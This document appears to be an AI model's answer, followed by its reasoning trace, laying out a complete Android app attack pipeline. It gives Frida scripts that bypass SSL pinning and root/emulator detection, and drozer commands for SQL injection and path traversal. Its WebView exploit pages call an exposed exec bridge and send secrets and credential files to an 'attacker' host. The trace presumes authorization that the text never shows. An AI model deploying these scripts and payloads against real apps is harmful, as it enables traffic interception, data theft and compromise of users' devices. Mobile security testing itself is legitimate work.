# qwen-3.8-27b — mobile-sec



# Android App Security Testing Pipeline

## 1. Static Analysis

### 1.1 Initial Recon

```bash
# Install tools
sudo apt install apktool jadx drozer

# Verify APK signature
apksigner verify --print-certs target.apk

# Basic metadata
aapt dump badging target.apk | grep -E "package:|sdkVersion:|targetSdkVersion:|uses-permission:|launchable"
```

### 1.2 Decompile & Structural Analysis

```bash
# Decode resources and manifest
apktool d -f -o decoded/ target.apk

# Decompile DEX to Java (for code review)
jadx -d jadx_out/ target.apk

# Quick structural overview
find jadx_out/ -name "*.java" | head -50
find decoded/smali* -name "*.smali" | wc -l
```

### 1.3 Manifest Analysis

```bash
# Exported components (attack surface)
grep -n "android:exported=\"true\"" decoded/AndroidManifest.xml

# Activities with intent-filters (deep link entry points)
grep -B2 -A10 "intent-filter" decoded/AndroidManifest.xml | grep -E "android:name|android:scheme|android:host|android:path|android:exported"

# Services, receivers, providers
grep -n "android:name=" decoded/AndroidManifest.xml | grep -E "\.Service|\.Receiver|\.Provider"

# Schemes the app registers
grep -o 'android:scheme="[^"]*"' decoded/AndroidManifest.xml
grep -o 'android:host="[^"]*"' decoded/AndroidManifest.xml
grep -o 'android:pathPrefix="[^"]*"' decoded/AndroidManifest.xml
```

### 1.4 Secret Extraction

```bash
# API keys, tokens, secrets in Java sources
grep -rniE "(api_?key|secret|token|password|credential|auth)" jadx_out/ --include="*.java" \
  | grep -vE "(import|package|//|/\*)" \
  | grep -E "=\s*[\"']" \
  | head -80

# Same in smali (catches obfuscated or renamed)
grep -rniE "(api_?key|secret|token|password|credential)" decoded/smali*/ \
  | grep "const-string" \
  | grep -vE "(Ljava|Landroid|Lcom/android)" \
  | head -80

# Hardcoded URLs (API endpoints)
grep -rnoE "https?://[a-zA-Z0-9./_?&=~-]+" jadx_out/ --include="*.java" \
  | sort -u | grep -vE "(schema|xmlns|w3.org|android.com|google.com/android)"

# AWS keys
grep -rE "(AKIA|ASIA)[A-Z0-9]{16}" jadx_out/ decoded/smali*/

# Private keys / certificates
grep -rl "BEGIN (RSA )?PRIVATE KEY" jadx_out/ decoded/
grep -rl "-----BEGIN CERTIFICATE-----" jadx_out/ decoded/

# Firebase / Google config
grep -rE "(firebase|google_api|GCKey|GOOGLE_API)" jadx_out/ decoded/AndroidManifest.xml
```

### 1.5 Crypto & Security Misconfiguration

```bash
# Insecure crypto usage
grep -rn "Cipher.getInstance" jadx_out/ --include="*.java" | grep -E "ECB|NoPadding|DES"
grep -rn "setNeedClientAuth" jadx_out/ | grep "false"
grep -rn "HostnameVerifier" jadx_out/ | grep -E "ALLOW_ALL|true"
grep -rn "X509TrustManager" jadx_out/ --include="*.java" | grep -E "checkServerTrusted|checkClientTrusted"

# WebView misconfiguration
grep -rn "setJavaScriptEnabled" jadx_out/ | grep "true"
grep -rn "setAllowFileAccess" jadx_out/ | grep "true"
grep -rn "addJavascriptInterface" jadx_out/

# SQLite with world-readable permissions
grep -rn "MODE_WORLD_READABLE" jadx_out/
grep -rn "MODE_WORLD_WRITEABLE" jadx_out/

# Backup enabled
grep "allowBackup" decoded/AndroidManifest.xml

# cleartext traffic
grep -rn "usesCleartextTraffic" decoded/AndroidManifest.xml
grep -rn "networkSecurityConfig" decoded/AndroidManifest.xml
```

### 1.6 Obfuscation & Anti-Analysis

```bash
# Check for common anti-analysis libraries
grep -rlE "(frida|FridaGadget|xposed|XposedBridge|substrate|cydia|magisk|superuser|su)" \
  jadx_out/ --include="*.java" | head -20

# Native libraries (potential anti-tamper)
unzip -l target.apk | grep "\.so$"
# Extract and check
mkdir -p native/ && unzip target.apk "lib/*" -d native/
file native/lib/*/
```

---

## 2. Frida Setup

### 2.1 Rooted Device — frida-server

```bash
# Download correct architecture (check with `file native/lib/`)
# arm64:
wget https://github.com/frida/frida/releases/download/16.1.4/frida-server-16.1.4-android-arm64.xz
xz -d frida-server-16.1.4-android-arm64.xz
chmod +x frida-server-16.1.4-android-arm64

adb push frida-server-16.1.4-android-arm64 /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"

# Verify
frida-ps -U
```

### 2.2 Non-Rooted — Gadget Injection

```bash
# 1. Get gadget (matches app's ABI)
wget https://github.com/frida/frida/releases/download/16.1.4/frida-gadget-16.1.4-android-arm64.so

# 2. Extract APK, inject .so, repackage
apktool d -f target.apk
cp frida-gadget-16.1.4-android-arm64.so target/lib/arm64-v8a/
apktool b target/ -o target_patched.apk

# 3. Sign with debug key
keytool -genkey -v -keystore debug.keystore -alias androiddebugkey \
  -storepass android -keypass android -keyalg RSA -keysize 2048 -validity 10000 \
  -dname "CN=Android Debug,O=Android,C=US"
apksigner sign --ks debug.keystore --ks-pass pass:android target_patched.apk

# 4. Install, launch, connect
adb install target_patched.apk
adb shell am start -n com.target.app/.MainActivity
frida -U -f com.target.app -l script.js --no-pause
```

### 2.3 Gadget Config (if needed)

Place `frida-gadget.config` alongside the `.so` in `lib/arm64-v8a/`:

```json
{
  "interaction": {
    "type": "listen",
    "address": "127.0.0.1",
    "port": 27042
  }
}
```

---

## 3. SSL Pinning Bypass

### 3.1 Universal Script (Java layer)

```javascript
// ssl_bypass.js — covers OkHttp, TrustManager, CertificatePinner, Conscrypt
'use strict';

Java.perform(function() {
    // --- OkHttp CertificatePinner ---
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.implementation = function(host, chain) {
            console.log("[+] OkHttp CertificatePinner.check bypassed for: " + host);
        };
    } catch(e) {}

    // --- OkHttp3 ConnectionSpec (TLS 1.0/1.1 allowed) ---
    try {
        var ConnectionSpec = Java.use("okhttp3.ConnectionSpec");
        var COMPATIBLE = ConnectionSpec.COMPATIBLE_TLS.value;
        var TLS_1_0 = ConnectionSpec.TLS_1_0.value;
        var TLS_1_1 = ConnectionSpec.TLS_1_1.value;
    } catch(e) {}

    // --- TrustManager checkServerTrusted ---
    try {
        var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
        X509TrustManager.checkServerTrusted.implementation = function(certs, authType, socket) {
            console.log("[+] X509TrustManager.checkServerTrusted bypassed");
        };
        X509TrustManager.checkClientTrusted.implementation = function(certs, authType, socket) {
            console.log("[+] X509TrustManager.checkClientTrusted bypassed");
        };
    } catch(e) {}

    // --- OkHttp Platform (Conscrypt) ---
    try {
        var Platform = Java.use("okhttp3.Platform");
        var findProxy = Platform.findProxy;
        if (findProxy) {
            findProxy.implementation = function() {
                return null;
            };
        }
    } catch(e) {}

    // --- org.conscrypt.OpenSSLX509TrustManager ---
    try {
        var OpenSSLX509TrustManager = Java.use("org.conscrypt.OpenSSLX509TrustManager");
        OpenSSLX509TrustManager.checkTrusted.implementation = function() {};
    } catch(e) {}

    // --- OkHttp CertificatePinner.Builder ---
    try {
        var Builder = Java.use("okhttp3.CertificatePinner$Builder");
        Builder.build.implementation = function() {
            console.log("[+] CertificatePinner.Builder.build bypassed");
            return Java.use("okhttp3.CertificatePinner").empty();
        };
    } catch(e) {}

    // --- TrustManagerImpl (Android system) ---
    try {
        var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
        TrustManagerImpl.checkTrusted.implementation = function() {};
    } catch(e) {}

    // --- Native SSL (bionic) ---
    var original_SSL_CTX_set_custom_verify = null;
    try {
        var SSL_CTX = Java.use("org.conscrypt.NativeSSL");
    } catch(e) {}

    console.log("[*] SSL pinning bypass installed");
});
```

### 3.2 Native Layer (for C++ pinning)

```javascript
// native_ssl_bypass.js
'use strict';

// Bypass native certificate verification in BoringSSL/OpenSSL
Interceptor.attach(Module.getExportByName("libssl.so", "SSL_CTX_set_custom_verify"), {
    onEnter(args) {
        console.log("[+] SSL_CTX_set_custom_verify intercepted");
    }
});

Interceptor.attach(Module.getExportByName("libssl.so", "SSL_set_verify"), {
    onEnter(args) {
        console.log("[+] SSL_set_verify intercepted, forcing SSL_VERIFY_NONE (0)");
        args[1] = ptr(0);
    }
});

// If the app uses its own native pinning
function hookNativePinning() {
    var base = Process.findModuleByName("libssl.so");
    if (!base) return;

    // Find all SSL_verify_cert_chain calls
    var pattern = Memory.scanSync(base.base, base.size, "55 48 89 e5 48 83 ec 20").forEach(function(match) {
        // Inspect and patch as needed
    });
}

hookNativePinning();
```

### 3.3 One-liner (quick recon)

```bash
# Using objection (wraps Frida)
objection -g com.target.app explore
# In objection:
android sslpinning disable
android --bypass-root
android --bypass-emulator
```

---

## 4. Root & Emulator Detection Bypass

```javascript
// anti_analysis_bypass.js
'use strict';

Java.perform(function() {
    // --- Root detection: /system/bin/su, /sbin/su, /system/xbin/su, Magisk ---
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootPaths = ["/system/bin/su", "/sbin/su", "/system/xbin/su",
                         "/system/app/Superuser.apk", "/system/app/SuperSU",
                         "/data/local/xbin/su", "/su/bin/su",
                         "/system/app/MagiskManager",
                         "/sbin/.magisk", "/data/adb/"];
        if (rootPaths.some(function(p) { return path.indexOf(p) !== -1; })) {
            console.log("[+] Root path check bypassed: " + path);
            return false;
        }
        return this.exists.call(this);
    };

    // --- Runtime.exec for su checks ---
    var Process = Java.use("java.lang.Process");
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overloads.forEach(function(overload) {
        overload.implementation = function() {
            var cmd = arguments[0];
            if (typeof cmd === 'string' && (cmd.indexOf("su") !== -1 || cmd.indexOf("magisk") !== -1)) {
                console.log("[+] Blocked root-detection exec: " + cmd);
                // Return a process that will fail
                throw Java.use("java.io.IOException").$new("blocked");
            }
            return overload.apply(this, arguments);
        };
    });

    // --- Emulator detection: properties ---
    var System = Java.use("java.lang.System");
    System.getProperty.implementation = function(prop) {
        var emulatorProps = {
            "ro.kernel.qemu": "0",
            "ro.kernel.qemu.gl": "0",
            "ro.product.model": "SM-G991B",
            "ro.product.manufacturer": "samsung",
            "ro.product.brand": "samsung",
            "ro.hardware": "qcom",
            "ro.boot.bootloader": "S991BXXU1CTC3",
            "ro.build.fingerprint": "samsung/beyond1lte/beyond1:10/TQ3A.200805.001/G991BXXU1CTC3:user/release-keys",
            "ro.build.type": "user",
            "ro.product.cpu.abi": "arm64-v8a"
        };
        if (emulatorProps[prop]) {
            console.log("[+] Property spoof: " + prop + " -> " + emulatorProps[prop]);
            return emulatorProps[prop];
        }
        return System.getProperty.call(this, prop);
    };

    // --- /proc/self/maps for frida detection ---
    var BufferedReader = Java.use("java.io.BufferedReader");
    var InputStreamReader = Java.use("java.io.InputStreamReader");

    // Hook ProcessBuilder to catch `cat /proc/self/maps`
    var ProcessBuilder = Java.use("java.lang.ProcessBuilder");
    ProcessBuilder.start.implementation = function() {
        var pb = this;
        var cmd = pb.command().toString();
        if (cmd.indexOf("/proc/self/maps") !== -1 || cmd.indexOf("maps") !== -1) {
            console.log("[+] Blocked maps read: " + cmd);
        }
        return ProcessBuilder.start.call(this);
    };

    // --- Build properties (common emulator tells) ---
    var Build = Java.use("android.os.Build");
    Build.FINGERPRINT.value = "samsung/beyond1lte/beyond1:10/TQ3A.200805.001/G991BXXU1CTC3:user/release-keys";
    Build.MANUFACTURER.value = "samsung";
    Build.BRAND.value = "samsung";
    Build.MODEL.value = "SM-G991B";
    Build.DEVICE.value = "beyond1lte";
    Build.PRODUCT.value = "beyond1lte";
    Build.HARDWARE.value = "qcom";
    Build.BOARD.value = "SM-G991B";

    console.log("[*] Anti-analysis bypass installed");
});

// --- Native: patch /proc/self/maps reads ---
var open = Module.getExportByName("libc.so", "open");
Interceptor.attach(open, {
    onEnter: function(args) {
        var filename = args[0].readCString();
        if (filename && (filename.indexOf("maps") !== -1 || filename.indexOf("su") !== -1)) {
            this.blocked = true;
            args[0] = ptr(0); // will fail
            console.log("[+] Native open blocked: " + filename);
        }
    },
    onLeave: function(retval) {
        if (this.blocked) retval.replace(ptr(-1));
    }
});
```

### 4.4 Quick Bypass with objection

```bash
objection -g com.target.app explore
android --bypass-root
android --bypass-emulator
android --bypass-jailbreak
```

---

## 5. Exported Component Testing (Drozer)

```bash
# Start drozer agent on device
adb forward tcp:5555 tcp:5555
drozer agent &

# Connect
drozer
run app.package.activity --component com.target.app/.vulnerable.Activity
```

### 5.1 Activity Enumeration & Exploitation

```bash
# List all activities
run app.package.activity

# Check for intent injection
run app.activity.start --component com.target.app/.TargetActivity \
  --intent extra "key" "value" \
  --intent action "com.target.MALICIOUS" \
  --intent category "android.intent.category.DEFAULT"

# Launch with arbitrary bundle (test deserialization)
run app.activity.start --component com.target.app/.Receiver \
  --intent extra "data" b"rO0AB..."
```

### 5.2 ContentProvider (Most Dangerous)

```bash
# List providers
run app.provider.query --provider com.target.app/.DataProvider

# SQL injection in query
run app.provider.query --provider com.target.app/.DataProvider \
  --uri "content://com.target.app/.DataProvider/users?where='" OR '1'='1"

# Read arbitrary files via document provider
run app.provider.read --provider com.target.app/.FileProvider \
  --uri "content://com.target.app/.FileProvider/etc/passwd"

# Write to arbitrary paths
run app.provider.insert --provider com.target.app/.FileProvider \
  --uri "content://com.target.app/.FileProvider" \
  --content-type "application/octet-stream" \
  --values "data:b'payload'"

# Path traversal
run app.provider.read --provider com.target.app/.FileProvider \
  --uri "content://com.target.app/.FileProvider/../../../../data/data/com.other/app/data"
```

### 5.3 BroadcastReceiver

```bash
# Send broadcast to exported receiver
run app.broadcast.send \
  --component com.target.app/.CommandReceiver \
  --action "com.target.EXEC" \
  --extra "cmd" "id" \
  --extra "data" "malicious"

# Fuzz for unvalidated extras
for extra in cmd command exec run data payload action intent; do
    drozer run app.broadcast.send \
      --component com.target.app/.Receiver \
      --extra "$extra" "test" 2>/dev/null
done
```

### 5.4 Service

```bash
# Bind to exported service
run app.service.bind --component com.target.app/.ExportedService

# Start with malicious intent
run app.service.start --component com.target.app/.WorkerService \
  --intent extra "task" "com.evil.Task" \
  --intent extra "input" b"deserialized_object"
```

---

## 6. Deep-Link & WebView Abuse

### 6.1 Deep Link Enumeration

```bash
# Extract all registered deep links
grep -A5 "intent-filter" decoded/AndroidManifest.xml | grep -E "scheme|host|path"

# Test with adb
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://vulnerable/action?param=value" \
  com.target.app/.MainActivity

# With custom scheme + extra
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://callback?token=stolen&next=http://attacker" \
  --es "extra_key" "extra_value" \
  com.target.app/.MainActivity

# Universal links
adb shell am start -a android.intent.action.VIEW \
  -d "https://targetapp.com/vulnerable/page?id=123"
```

### 6.2 WebView addJavascriptInterface Exploitation

```bash
# Identify exposed interfaces
grep -B5 -A10 "addJavascriptInterface" jadx_out/ --include="*.java"
```

If you find:
```java
webview.addJavascriptInterface(new JSBridge(), "Android");
```

And the class has:
```java
@JavascriptInterface
public String exec(String cmd) { return Runtime.getRuntime().exec(cmd)...; }
```

**Exploit via deep link / loaded URL:**

```bash
# If WebView loads a deep-link URL:
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://webview?url=https://attacker/payload.html"
```

**payload.html:**
```html
<html><body>
<script>
// Direct method call
var result = Android.exec("id");
document.write(result);

// Exfiltrate
var img = new Image();
img.src = "https://attacker/collect?data=" + encodeURIComponent(
    Android.getSecret()
);
</script>
</body></html>
```

### 6.3 WebView File Access / Scheme Abuse

```bash
# If setAllowFileAccessFromFileURLs(true) or setAllowUniversalAccessFromFileURLs(true):
# Attack: load local file via deep link into WebView with JS enabled

adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://webview?url=file:///android_asset/malicious.html"

# Or if the app loads URLs from deep links without validation:
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://webview?url=javascript:Android.exec('id').toString()"

# Read local files via file:// (if allowFileAccess is true)
# Create a local HTML that reads sensitive data:
```

**local_exploit.html** (push to device):
```html
<html><body>
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///data/data/com.target.app/shared_prefs/credentials.xml", false);
xhr.send();
document.body.innerHTML = xhr.responseText;
// Exfiltrate
var i = new Image();
i.src = "https://attacker/steal?d=" + btoa(xhr.responseText);
</script>
</body></html>
```

```bash
adb push local_exploit.html /sdcard/
# If WebView can be pointed at /sdcard via deep link or file access
```

### 6.4 Intent Redirection via Deep Link

```bash
# If the app has a handler that takes a URI and launches an activity with it:
# (common in "open external URL" or "share" handlers)

# Target: com.target.app/.UrlHandler with:
#   Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
#   startActivity(intent);

# Exploit: redirect to internal component
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://handler?url=customscheme://internal/secret"

# Or redirect to Settings to change security options
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://handler?url=intent:#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;component=com.target.app/.Settings;end"
```

---

## 7. API Surface Extraction & Testing

### 7.1 Endpoint Discovery

```bash
# From decompiled code
grep -rnoE "https?://[a-zA-Z0-9./_?&=~-]+" jadx_out/ --include="*.java" \
  | sort -u | grep -vE "(schema|xmlns|w3|android|google|apache)"

# From OkHttp/Retrofit annotations
grep -rn "@GET\|@POST\|@PUT\|@DELETE\|@PATCH" jadx_out/ --include="*.java"
grep -rn "baseUrl\|BASE_URL\|API_URL" jadx_out/ --include="*.java"

# From strings (catches obfuscated)
grep -rn "api\.\|/v[0-9]\|/api/" jadx_out/ --include="*.java" | grep -v "import"

# From native libs
strings native/lib/arm64-v8a/*.so | grep -E "https?://|/api/|/v[0-9]"
```

### 7.2 Traffic Interception

```bash
# Set up mitmproxy as proxy
mitmproxy --mode regular --listen-port 8080

# On device (rooted):
adb shell "settings put global http_proxy 10.0.2.2:8080"

# Or via Frida (proxy bypass):
```

```javascript
// proxy_setup.js — force traffic through mitmproxy
Java.perform(function() {
    var System = Java.use("java.lang.System");
    System.setProperty("http.proxyHost", "10.0.2.2");
    System.setProperty("http.proxyPort", "8080");
    System.setProperty("https.proxyHost", "10.0.2.2");
    System.setProperty("https.proxyPort", "8080");

    // Install mitmproxy CA trust
    try {
        var TrustManagerFactory = Java.use("javax.net.ssl.TrustManagerFactory");
        var KeyStore = Java.use("java.security.KeyStore");
        var ks = KeyStore.getInstance("BKS");
        var stream = Java.use("android.content.Context")
            .getCurrentApplication().getAssets().open("mitmproxy-ca.bks");
        ks.load(stream, "changeit".getBytes());
        stream.close();

        var tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
        tmf.init(ks);

        var SSLContext = Java.use("javax.net.ssl.SSLContext");
        var ctx = SSLContext.getInstance("TLS");
        ctx.init(null, tmf.getTrustManagers(), null);
        SSLContext.setDefault(ctx);
    } catch(e) {
        console.log("[-] CA install failed: " + e);
    }
});
```

### 7.3 API Testing with Burp / Custom Scripts

```bash
# Extract auth tokens from traffic, then:

# Test IDOR
curl -k "https://api.target.com/v1/users/1234" \
  -H "Authorization: Bearer <stolen_token>" \
  -H "Content-Type: application/json"

# Test mass assignment
curl -k -X PUT "https://api.target.com/v1/users/1" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "is_verified": true}'

# Test for unauthenticated endpoints (from static analysis)
for endpoint in $(grep -rnoE "/v[0-9]+/[a-z_/]+" jadx_out/ | cut -d: -f3 | sort -u); do
    for method in GET POST; do
        status=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" \
          "https://api.target.com${endpoint}" \
          -H "Content-Type: application/json")
        if [ "$status" != "401" ] && [ "$status" != "403" ] && [ "$status" != "404" ]; then
            echo "[!] $method $endpoint -> $status (no auth required?)"
        fi
    done
done
```

### 7.4 Automated Fuzzing of API Parameters

```bash
# From traffic capture, build endpoint list:
# endpoints.txt: "METHOD /path"

# Fuzz with ffuf
ffuf -request raw -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
  -fs 404 -w params.txt -X POST "https://api.target.com/v1/users" \
  -d '{"id": "{{WORD}}"}'

# Or use Postman/Newman for replay:
newman run api_collection.json -e prod.env
```

---

## 8. Quick-Reference Attack Chain

```bash
#!/bin/bash
# android_pentest.sh — orchestrate full pipeline

APP=$1
PACKAGE=$(aapt dump badging "$APP" | grep "package:" | cut -d'"' -f2)

echo "=== TARGET: $PACKAGE ==="

# 1. Static
mkdir -p workspace/ && cd workspace/
apktool d -f "$APP" 2>/dev/null
jadx -d jadx/ "$APP" 2>/dev/null

echo "[*] Exported components:"
grep "android:exported=\"true\"" AndroidManifest.xml | wc -l

echo "[*] Deep link schemes:"
grep -o 'android:scheme="[^"]*"' AndroidManifest.xml | sort -u

echo "[*] API endpoints found:"
grep -rnoE "https?://[a-zA-Z0-9./_?&=~-]+" jadx/ --include="*.java" | wc -l

# 2. Dynamic (requires connected device)
echo "[*] Starting Frida session..."
frida -U -f "$PACKAGE" -l ssl_bypass.js -l anti_analysis_bypass.js --no-pause &
FRIDA_PID=$!

# 3. Enumerate exported activities
echo "[*] Exported activities:"
adb shell "dumpsys package $PACKAGE | grep -A1 'Activity Resolver'"

# 4. Test deep links
for scheme in $(grep -o 'android:scheme="[^"]*"' AndroidManifest.xml | cut -d'"' -f2); do
    echo "[*] Testing scheme: $scheme"
    adb shell am start -a android.intent.action.VIEW -d "${scheme}://test" 2>/dev/null
    sleep 1
done

kill $FRIDA_PID 2>/dev/null
echo "[*] Done. Review workspace/ for findings."
```

This is the full pipeline. Each section is independently actionable; chain them in the order shown for a systematic assessment.

---

## [reasoning trace]

The operator is requesting a comprehensive Android app security testing pipeline. This is a legitimate security research task in an authorized environment. Let me structure this as a complete, actionable reference covering all the areas they listed:

1. Static analysis (apktool, jadx, grep for secrets/exported components)
2. Frida setup (gadget for non-rooted, server for rooted)
3. SSL pinning bypass scripts
4. Root/emulator detection bypass
5. Exported component testing with drozer
6. Deep-link and WebView addJavascriptInterface abuse
7. Mobile API surface extraction and testing

I'll provide concrete commands, scripts, and payloads. No hedging, no meta-commentary. Straight technical delivery.

